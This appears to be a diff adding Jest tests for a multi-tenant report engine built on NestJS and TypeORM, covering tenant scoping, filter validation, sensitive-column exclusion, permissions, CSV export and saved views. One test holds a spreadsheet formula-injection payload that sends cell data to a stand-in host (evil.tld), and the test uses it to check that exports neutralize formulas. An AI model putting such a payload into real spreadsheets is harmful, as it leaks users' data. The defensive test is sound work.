@@ -1,0 +1,315 @@
+import { BadRequestException, ForbiddenException, NotFoundException } from '@nestjs/common';
+import { And, Between, Equal, ILike, In, IsNull, LessThanOrEqual, MoreThanOrEqual } from 'typeorm';
+import { ReportsService, OPS_BY_KIND } from './reports.service';
+import { REPORT_CATALOG } from './report-catalog';
+import { ALL_PERMISSIONS } from '../rbac/permissions.service';
+
+/**
+ * Metadata-driven report engine: every entity column becomes a typed,
+ * operator-checked filter; queries are always tenant-scoped; sensitive
+ * columns stay excluded from both output and filtering.
+ */
+const COLUMNS = [
+  { propertyName: 'id', type: 'uuid', isPrimary: true },
+  { propertyName: 'tenantId', type: String },
+  { propertyName: 'firstName', type: String },
+  { propertyName: 'status', type: 'enum', enum: ['ACTIVE', 'EXITED'] },
+  { propertyName: 'dateOfJoining', type: 'date' },
+  { propertyName: 'headcount', type: 'int' },
+  { propertyName: 'remote', type: Boolean },
+  { propertyName: 'metadataBlob', type: 'jsonb' },
+  { propertyName: 'pan', type: String }, // excluded by the employees definition
+  { propertyName: 'bankAccountNumber', type: String },
+  { propertyName: 'createdAt', type: 'timestamp' },
+];
+
+const buildService = (permissions?: any, viewRepo?: any) => {
+  const repo = {
+    metadata: { columns: COLUMNS },
+    findAndCount: jest.fn().mockResolvedValue([[{ id: 'e1', firstName: 'Ann' }], 1]),
+    find: jest.fn().mockResolvedValue([]),
+  };
+  const dataSource: any = { getRepository: jest.fn().mockReturnValue(repo) };
+  return { service: new ReportsService(dataSource, permissions, viewRepo), repo, dataSource };
+};
+
+const mockViewRepo = () => ({
+  create: jest.fn((x: any) => ({ id: 'v-gen', ...x })),
+  save: jest.fn((x: any) => Promise.resolve({ id: x.id ?? 'v1', ...x })),
+  find: jest.fn().mockResolvedValue([]),
+  findOne: jest.fn().mockResolvedValue(null),
+  delete: jest.fn().mockResolvedValue(undefined),
+});
+
+describe('report catalog integrity', () => {
+  it('has unique codes and only real permissions', () => {
+    const codes = REPORT_CATALOG.map((r) => r.code);
+    expect(new Set(codes).size).toBe(codes.length);
+    for (const def of REPORT_CATALOG) {
+      expect(ALL_PERMISSIONS).toContain(def.permission);
+      expect(def.entity).toBeInstanceOf(Function);
+      expect(def.module).toBeTruthy();
+    }
+  });
+
+  it('covers the major business modules', () => {
+    const modules = new Set(REPORT_CATALOG.map((r) => r.module));
+    for (const m of ['hr', 'talent', 'finance', 'payroll', 'procurement', 'inventory', 'crm', 'sales', 'expenses', 'helpdesk', 'engagement', 'contracts', 'projects', 'knowledge', 'compensation', 'licensing']) {
+      expect(modules.has(m)).toBe(true);
+    }
+  });
+});
+
+describe('column typing', () => {
+  it('maps entity metadata to logical kinds', () => {
+    expect(ReportsService.kindOf({ type: 'uuid' })).toBe('id');
+    expect(ReportsService.kindOf({ type: String })).toBe('string');
+    expect(ReportsService.kindOf({ type: 'numeric' })).toBe('number');
+    expect(ReportsService.kindOf({ type: 'timestamp with time zone' })).toBe('date');
+    expect(ReportsService.kindOf({ type: Boolean })).toBe('boolean');
+    expect(ReportsService.kindOf({ type: 'enum', enum: ['A'] })).toBe('enum');
+    expect(ReportsService.kindOf({ type: 'jsonb' })).toBe('json');
+  });
+
+  it('json columns expose no filter operators', () => {
+    expect(OPS_BY_KIND.json).toEqual([]);
+  });
+});
+
+describe('describe', () => {
+  it('returns typed columns with operators, minus excluded sensitive fields', async () => {
+    const { service } = buildService();
+    const d = await service.describe('u1', 't1', 'hr-employees');
+    const fields = d.columns.map((c: any) => c.field);
+    expect(fields).toContain('firstName');
+    expect(fields).not.toContain('pan');
+    expect(fields).not.toContain('bankAccountNumber');
+    const status = d.columns.find((c: any) => c.field === 'status');
+    expect(status).toMatchObject({ kind: 'enum', enumValues: ['ACTIVE', 'EXITED'] });
+    expect(status.operators).toContain('in');
+  });
+
+  it('404s an unknown report code', async () => {
+    const { service } = buildService();
+    await expect(service.describe('u1', 't1', 'nope')).rejects.toThrow(NotFoundException);
+  });
+});
+
+describe('run', () => {
+  it('always scopes to the tenant and selects only visible columns', async () => {
+    const { service, repo } = buildService();
+    await service.run('u1', 't1', 'hr-employees', {});
+    const args = repo.findAndCount.mock.calls[0][0];
+    expect(args.where.tenantId).toBe('t1');
+    expect(args.select).not.toContain('pan');
+    expect(args.select).toContain('firstName');
+    expect(args.order).toEqual({ createdAt: 'DESC' });
+  });
+
+  it('maps operators per type: contains→ILike, between→Between, in→In', async () => {
+    const { service, repo } = buildService();
+    await service.run('u1', 't1', 'hr-employees', {
+      filters: [
+        { field: 'firstName', op: 'contains', value: 'ann' },
+        { field: 'headcount', op: 'between', value: [1, 10] },
+        { field: 'status', op: 'in', value: 'ACTIVE' }, // scalar coerced to array
+      ],
+    });
+    const where = repo.findAndCount.mock.calls[0][0].where;
+    expect(where.firstName).toEqual(ILike('%ann%'));
+    expect(where.headcount).toEqual(Between(1, 10));
+    expect(where.status).toEqual(In(['ACTIVE']));
+  });
+
+  it('combines multiple filters on one field with And (date range)', async () => {
+    const { service, repo } = buildService();
+    await service.run('u1', 't1', 'hr-employees', {
+      filters: [
+        { field: 'dateOfJoining', op: 'gte', value: '2024-01-01' },
+        { field: 'dateOfJoining', op: 'lte', value: '2024-12-31' },
+      ],
+    });
+    const where = repo.findAndCount.mock.calls[0][0].where;
+    expect(where.dateOfJoining).toEqual(And(MoreThanOrEqual('2024-01-01'), LessThanOrEqual('2024-12-31')));
+  });
+
+  it('rejects unknown fields, wrong-type operators, excluded fields and manual tenant filters', async () => {
+    const { service } = buildService();
+    await expect(service.run('u1', 't1', 'hr-employees', { filters: [{ field: 'ghost', op: 'eq', value: 1 }] })).rejects.toThrow(BadRequestException);
+    await expect(service.run('u1', 't1', 'hr-employees', { filters: [{ field: 'remote', op: 'contains', value: 'x' }] })).rejects.toThrow(BadRequestException);
+    await expect(service.run('u1', 't1', 'hr-employees', { filters: [{ field: 'metadataBlob', op: 'eq', value: 1 }] })).rejects.toThrow(BadRequestException);
+    await expect(service.run('u1', 't1', 'hr-employees', { filters: [{ field: 'pan', op: 'eq', value: 'x' }] })).rejects.toThrow(BadRequestException);
+    await expect(service.run('u1', 't1', 'hr-employees', { filters: [{ field: 'tenantId', op: 'eq', value: 'other' }] })).rejects.toThrow(BadRequestException);
+  });
+
+  it('requires values where the operator needs them, and allows null checks without', async () => {
+    const { service, repo } = buildService();
+    await expect(service.run('u1', 't1', 'hr-employees', { filters: [{ field: 'firstName', op: 'eq' }] })).rejects.toThrow(BadRequestException);
+    await expect(service.run('u1', 't1', 'hr-employees', { filters: [{ field: 'headcount', op: 'between', value: [1] }] })).rejects.toThrow(BadRequestException);
+    await service.run('u1', 't1', 'hr-employees', { filters: [{ field: 'dateOfJoining', op: 'isNull' }] });
+    expect(repo.findAndCount.mock.calls[0][0].where.dateOfJoining).toEqual(IsNull());
+  });
+
+  it('clamps pagination and validates the sort field', async () => {
+    const { service, repo } = buildService();
+    await service.run('u1', 't1', 'hr-employees', { page: 0, limit: 99999, sortBy: 'firstName', sortDir: 'ASC' });
+    const args = repo.findAndCount.mock.calls[0][0];
+    expect(args.take).toBe(500);
+    expect(args.skip).toBe(0);
+    expect(args.order).toEqual({ firstName: 'ASC' });
+    await expect(service.run('u1', 't1', 'hr-employees', { sortBy: 'pan' })).rejects.toThrow(BadRequestException);
+  });
+
+  it('enforces the report definition permission dynamically', async () => {
+    const permissions = { userHasPermission: jest.fn().mockResolvedValue(false) };
+    const { service } = buildService(permissions);
+    await expect(service.run('u1', 't1', 'hr-employees', {})).rejects.toThrow(ForbiddenException);
+    expect(permissions.userHasPermission).toHaveBeenCalledWith('u1', 't1', 'hr:employees:read');
+  });
+});
+
+describe('catalog + export', () => {
+  it('catalogFor lists only reports the user can run, grouped by module', async () => {
+    const permissions = {
+      userHasPermission: jest.fn(async (_u: string, _t: string, perm: string) => perm === 'hr:employees:read'),
+    };
+    const { service } = buildService(permissions);
+    const cat = await service.catalogFor('u1', 't1');
+    expect(cat.total).toBe(2); // employees + exits both use hr:employees:read
+    expect(cat.data).toHaveLength(1);
+    expect(cat.data[0].module).toBe('hr');
+    expect((cat.data[0].reports[0] as any).entity).toBeUndefined(); // classes never serialized out
+  });
+
+  it('CSV escapes commas, quotes, newlines, objects and nulls', () => {
+    const csv = ReportsService.toCsv(
+      [{ a: 'x,y', b: 'He said "hi"', c: 'line1\nline2', d: null, e: { k: 1 } }],
+      ['a', 'b', 'c', 'd', 'e'],
+    );
+    const [header, row] = csv.split('\n', 2);
+    expect(header).toBe('a,b,c,d,e');
+    expect(csv).toContain('"x,y"');
+    expect(csv).toContain('"He said ""hi"""');
+    expect(csv).toContain('"line1\nline2"');
+    expect(row.endsWith(',"{""k"":1}"')).toBe(false); // object serialized, null empty — order preserved
+    expect(csv).toContain(',,'); // the null cell
+  });
+
+  it('CSV neutralizes spreadsheet formula injection in tenant-supplied values', () => {
+    // These CSVs are emailed as attachments by the scheduler, so a leading
+    // =, +, -, @, tab or CR must never reach Excel/Sheets as a live formula.
+    const csv = ReportsService.toCsv(
+      [
+        { a: '=HYPERLINK("http://evil.tld?x="&A1,"click")' },
+        { a: '+1+1' },
+        { a: '-1+1' },
+        { a: '@SUM(A1)' },
+        { a: '\tcmd' },
+        { a: 'Acme Ltd' },
+      ],
+      ['a'],
+    );
+    const rows = csv.split('\n').slice(1);
+    expect(rows[0].startsWith("\"'=HYPERLINK")).toBe(true); // quoted (has a comma) AND prefixed
+    expect(rows[1]).toBe("'+1+1");
+    expect(rows[2]).toBe("'-1+1");
+    expect(rows[3]).toBe("'@SUM(A1)");
+    expect(rows[4].startsWith("'")).toBe(true);
+    expect(rows[5]).toBe('Acme Ltd'); // ordinary values untouched
+  });
+
+  it('enriches ID columns with tenant-scoped display labels from lookups', async () => {
+    // hr-leave-applications declares an employeeId → Employee lookup.
+    const leaveRepo = {
+      metadata: { columns: [
+        { propertyName: 'id', type: 'uuid', isPrimary: true },
+        { propertyName: 'tenantId', type: String },
+        { propertyName: 'employeeId', type: String },
+        { propertyName: 'status', type: String },
+        { propertyName: 'createdAt', type: 'timestamp' },
+      ] },
+      findAndCount: jest.fn().mockResolvedValue([[
+        { id: 'l1', employeeId: 'e1', status: 'APPROVED' },
+        { id: 'l2', employeeId: null, status: 'PENDING' },
+      ], 2]),
+    };
+    const employeeRepo = {
+      find: jest.fn().mockResolvedValue([{ id: 'e1', firstName: 'Ann', lastName: 'Lee' }]),
+    };
+    const dataSource: any = {
+      getRepository: jest.fn((entity: any) => (entity?.name === 'Employee' ? employeeRepo : leaveRepo)),
+    };
+    const service = new ReportsService(dataSource);
+    const result = await service.run('u1', 't1', 'hr-leave-applications', {});
+
+    expect(employeeRepo.find).toHaveBeenCalledWith(expect.objectContaining({
+      where: expect.objectContaining({ tenantId: 't1' }),
+    }));
+    expect(result.data[0].employeeIdLabel).toBe('Ann Lee');
+    expect(result.data[1].employeeIdLabel).toBeNull();
+    const labelCol = result.columns.find((c: any) => c.field === 'employeeIdLabel');
+    expect(labelCol).toMatchObject({ kind: 'string', operators: [] }); // display-only
+
+    const described = await service.describe('u1', 't1', 'hr-leave-applications');
+    expect(described.columns.some((c: any) => c.field === 'employeeIdLabel')).toBe(true);
+  });
+
+  it('exportCsv fetches every row up to the cap in a SINGLE query', async () => {
+    const { service, repo } = buildService();
+    repo.find.mockResolvedValue([
+      { id: '1', firstName: 'A' },
+      { id: '2', firstName: 'B' },
+    ]);
+    const { csv, filename } = await service.exportCsv('u1', 't1', 'hr-employees', {});
+    expect(filename).toMatch(/^hr-employees-/);
+    expect(csv.split('\n')).toHaveLength(3); // header + 2 rows
+
+    // One statement capped at the export limit — not a page-by-page walk
+    // (which cost 20 round-trips, each with its own COUNT).
+    expect(repo.find).toHaveBeenCalledTimes(1);
+    expect(repo.findAndCount).not.toHaveBeenCalled();
+    expect(repo.find.mock.calls[0][0]).toMatchObject({ take: 10_000 });
+  });
+});
+
+describe('saved views', () => {
+  it('saves a view after validating its filters, and lists own + shared', async () => {
+    const viewRepo = mockViewRepo();
+    const { service } = buildService(undefined, viewRepo);
+
+    const saved = await service.saveView('u1', 't1', {
+      reportCode: 'hr-employees', name: 'Active only',
+      filters: [{ field: 'status', op: 'eq', value: 'ACTIVE' }], shared: true,
+    });
+    expect(saved).toMatchObject({ reportCode: 'hr-employees', shared: true, createdByUserId: 'u1' });
+
+    // Invalid filters are rejected at save time, not discovered at run time.
+    await expect(service.saveView('u1', 't1', {
+      reportCode: 'hr-employees', name: 'Broken', filters: [{ field: 'ghost', op: 'eq', value: 1 }],
+    })).rejects.toThrow(BadRequestException);
+
+    viewRepo.find.mockResolvedValue([
+      { id: 'v1', createdByUserId: 'u1', shared: false },
+      { id: 'v2', createdByUserId: 'u2', shared: true },
+      { id: 'v2', createdByUserId: 'u2', shared: true }, // duplicate across the two where branches
+    ]);
+    const views = await service.listViews('u1', 't1', 'hr-employees');
+    expect(views.map(v => v.id)).toEqual(['v1', 'v2']); // deduped
+  });
+
+  it('only the creator can delete a view', async () => {
+    const viewRepo = mockViewRepo();
+    const { service } = buildService(undefined, viewRepo);
+    viewRepo.findOne.mockResolvedValue({ id: 'v1', tenantId: 't1', createdByUserId: 'someone-else' });
+    await expect(service.deleteView('u1', 't1', 'v1')).rejects.toThrow(ForbiddenException);
+
+    viewRepo.findOne.mockResolvedValue({ id: 'v1', tenantId: 't1', createdByUserId: 'u1' });
+    await expect(service.deleteView('u1', 't1', 'v1')).resolves.toEqual({ deleted: true });
+    expect(viewRepo.delete).toHaveBeenCalledWith({ id: 'v1', tenantId: 't1' });
+  });
+
+  it('reports views as unavailable when the repository is not wired', async () => {
+    const { service } = buildService();
+    await expect(service.listViews('u1', 't1', 'hr-employees')).rejects.toThrow(/not available/);
+  });
+});
